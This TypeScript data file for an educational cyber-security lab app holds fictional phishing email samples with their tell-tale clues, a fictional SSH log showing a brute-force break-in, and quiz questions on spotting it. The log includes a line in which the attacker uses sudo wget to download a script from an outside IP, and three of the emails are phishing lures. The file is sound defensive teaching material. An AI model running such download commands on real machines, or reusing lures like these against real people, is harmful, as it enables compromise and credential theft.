// Cyber Labs content. Every name, address, and message here is fictional,
// using reserved example domains (example.com/.net) and documentation IP
// ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) where possible.

import type { QuizQuestion } from '../lib/learning/progress.ts';

export interface Lab {
  id: string;
  title: string;
  summary: string;
  minutes: number;
  status: 'ready' | 'planned';
}

export const LABS: readonly Lab[] = [
  { id: 'phishing-simulation', title: 'Phishing Simulation Lab', summary: 'Sort fictional emails into phishing or legitimate, then see the clues you caught or missed.', minutes: 8, status: 'ready' },
  { id: 'log-analysis', title: 'Log Analysis Lab', summary: 'Investigate a fictional login log to find a brute-force attack and the account it broke into.', minutes: 10, status: 'ready' },
  { id: 'terminal', title: 'Terminal Simulator', summary: 'Practice Linux commands in a safe, pretend shell and investigate a suspicious machine.', minutes: 10, status: 'ready' },
  { id: 'password-lab', title: 'Password Security Lab', summary: 'Experiment with how length and character choices change guessing difficulty.', minutes: 8, status: 'planned' },
  { id: 'crypto-lab', title: 'Cryptography Lab', summary: 'Hash, encode, and encrypt step by step to see how each one behaves.', minutes: 10, status: 'planned' },
  { id: 'network-lab', title: 'Network Fundamentals Lab', summary: 'Read simulated DNS records, IP addresses, and ports, with knowledge checks.', minutes: 10, status: 'planned' },
  { id: 'incident-response', title: 'Incident Response Lab', summary: 'Work through a fictional incident and choose the right defensive steps.', minutes: 12, status: 'planned' },
];

export const READY_LAB_IDS = new Set(LABS.filter((l) => l.status === 'ready').map((l) => l.id));
export const findLab = (id: string) => LABS.find((l) => l.id === id);

// ---------------- Phishing Simulation ----------------

export interface SimEmail {
  id: string;
  from: string;
  subject: string;
  body: string;
  /** The link shown in the email, if any (display text → real destination). */
  link?: { text: string; href: string };
  phishing: boolean;
  clues: string[];
}

export const SIM_EMAILS: readonly SimEmail[] = [
  {
    id: 'e1', phishing: true,
    from: 'Steam Support <support@steampowered-security.example>',
    subject: 'URGENT: Your account will be suspended in 24 hours',
    body: 'We detected unusual trade activity on your account. To avoid permanent suspension, verify your login details within 24 hours using the secure link below.',
    link: { text: 'Verify my account', href: 'https://steamcommunity.com.verify-login.example/auth' },
    clues: ['The sender’s domain is steampowered-security.example, not steampowered.com.', 'The link’s real site is verify-login.example; “steamcommunity.com” is just a subdomain disguise.', 'A 24-hour suspension threat is pressure to act before thinking.'],
  },
  {
    id: 'e2', phishing: false,
    from: 'GitHub <noreply@github.com>',
    subject: '[GitHub] A new SSH key was added to your account',
    body: 'A new public key was added to your account. If you added this key, you can ignore this message. If not, review your account’s security settings on github.com.',
    clues: ['The sender domain is the real github.com.', 'It doesn’t ask for a password or code, and it tells you to go to the site yourself.', 'Security notices like this are normal. If you didn’t add a key, you’d check by typing github.com yourself.'],
  },
  {
    id: 'e3', phishing: true,
    from: 'Discord Nitro <gifts@dlscord-nitro.example>',
    subject: 'You’ve been gifted 3 months of Nitro!',
    body: 'A friend sent you a Nitro gift! Claim it before it expires tonight. Log in with your Discord account to activate.',
    link: { text: 'Claim gift', href: 'https://dlscord-nitro.example/claim' },
    clues: ['“dlscord” swaps the i for an l: a look-alike domain.', 'Free gifts that expire tonight are classic bait.', 'Real Discord gifts appear inside Discord, not on a login page from an email.'],
  },
  {
    id: 'e4', phishing: false,
    from: 'Epic Games <help@accts.epicgames.com>',
    subject: 'Your Epic Games security code',
    body: 'Here is the security code you requested: 482 913. If you didn’t request this code, someone may be trying to sign in. Don’t share this code with anyone, including Epic employees.',
    clues: ['It’s from an epicgames.com subdomain, and you just requested a code.', 'It explicitly says never to share the code.', 'Warning sign if you DIDN’T request it: someone has your password. Change it and turn on 2FA.'],
  },
  {
    id: 'e5', phishing: true,
    from: 'School IT Helpdesk <it-helpdesk.mailbox@gmail.example>',
    subject: 'Mailbox storage full: action required',
    body: 'Your school mailbox is 99% full and will stop receiving email. Reply with your username and password so we can increase your storage.',
    clues: ['Real IT departments use the school’s own domain, not a free email account.', 'No legitimate helpdesk asks for your password by email.', 'The fake “storage full” deadline creates urgency.'],
  },
];

// ---------------- Log Analysis ----------------

/** A fictional SSH authentication log for a small server. */
export const LOG_LINES: readonly string[] = [
  'Nov 03 01:58:12 web01 sshd[2201]: Accepted publickey for deploy from 192.0.2.10 port 40112',
  'Nov 03 02:14:07 web01 sshd[2310]: Failed password for root from 203.0.113.45 port 51122',
  'Nov 03 02:14:09 web01 sshd[2310]: Failed password for root from 203.0.113.45 port 51124',
  'Nov 03 02:14:11 web01 sshd[2311]: Failed password for admin from 203.0.113.45 port 51130',
  'Nov 03 02:14:13 web01 sshd[2311]: Failed password for admin from 203.0.113.45 port 51133',
  'Nov 03 02:14:15 web01 sshd[2312]: Failed password for jsmith from 203.0.113.45 port 51140',
  'Nov 03 02:14:17 web01 sshd[2312]: Failed password for jsmith from 203.0.113.45 port 51141',
  'Nov 03 02:14:19 web01 sshd[2313]: Failed password for jsmith from 203.0.113.45 port 51145',
  'Nov 03 02:14:22 web01 sshd[2313]: Accepted password for jsmith from 203.0.113.45 port 51149',
  'Nov 03 02:15:40 web01 sudo: jsmith : USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/x.sh',
  'Nov 03 02:16:02 web01 sshd[2320]: Failed password for invalid user test from 198.51.100.23 port 40001',
  'Nov 03 09:02:45 web01 sshd[2401]: Accepted password for jsmith from 192.0.2.55 port 52210',
  'Nov 03 09:03:10 web01 sshd[2402]: Accepted publickey for deploy from 192.0.2.10 port 40188',
];

export const LOG_QUESTIONS: readonly QuizQuestion[] = [
  { id: 'l1', question: 'Which IP address made the brute-force attempt (many failed logins in a few seconds)?', options: ['192.0.2.10', '203.0.113.45', '198.51.100.23', '192.0.2.55'], answer: 1, explanation: '203.0.113.45 made 7 failed attempts against root, admin, and jsmith within 12 seconds: a password-guessing attack.' },
  { id: 'l2', question: 'Which account was compromised?', options: ['root', 'admin', 'jsmith', 'deploy'], answer: 2, explanation: 'At 02:14:22 the same attacking IP got “Accepted password for jsmith” right after failures. Success after a burst of failures from one IP is the key sign.' },
  { id: 'l3', question: 'What did the attacker do right after getting in?', options: ['Logged out immediately', 'Used sudo to download a script from 198.51.100.77', 'Changed the root password', 'Nothing was logged'], answer: 1, explanation: 'At 02:15:40 jsmith ran wget through sudo to fetch x.sh from an outside server: likely malware or a backdoor.' },
  { id: 'l4', question: 'The 09:02 login for jsmith comes from 192.0.2.55, a different IP. What’s the best first response?', options: ['Ignore it; it’s probably the real user', 'Disable jsmith, block 203.0.113.45, and investigate x.sh before trusting any jsmith login', 'Delete the log file', 'Restart the server and move on'], answer: 1, explanation: 'Once an account is known to be compromised, every later login is suspect. Contain first (disable, block), then investigate what was downloaded. Never delete evidence.' },
];
